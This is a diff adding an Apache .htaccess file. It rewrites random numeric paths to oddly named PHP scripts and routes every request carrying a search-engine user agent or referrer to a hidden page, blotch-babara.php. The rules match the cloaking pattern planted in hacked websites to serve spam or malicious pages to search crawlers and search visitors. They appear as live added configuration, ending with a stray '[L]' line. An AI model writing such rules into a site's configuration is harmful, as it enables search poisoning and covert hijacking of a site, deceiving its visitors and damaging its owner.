@@ -1,0 +1,19 @@
+RewriteEngine on
+RewriteRule ^3395228747/(.*)$ bridges-item.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^7930880635/(.*)$ empiricist-counterexample.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^6389554592/(.*)$ fermented-ambient.php [QSA,L]
+
+RewriteEngine On
+
+RewriteCond %{ENV:REDIRECT_STATUS} 200
+RewriteRule ^ - [L]
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^(.*)$ blotch-babara.php?$1 [L]
+
+[L]
+
